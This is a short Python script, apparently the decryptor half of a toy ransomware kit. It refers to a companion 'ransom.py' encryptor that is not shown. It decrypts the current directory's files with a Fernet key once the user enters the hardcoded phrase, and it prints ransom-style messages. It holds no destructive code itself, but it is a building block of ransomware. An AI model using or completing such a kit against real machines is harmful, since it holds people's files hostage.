#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
	if file == "ransom.py" or file == "thekey.key" or file == "unlock.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "newjeans"

user_phrase = input("Enter secret phrase to unlock files\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Congrats! A pleasure to have a business with you")
else:
	print("Where's my SnackPack?")
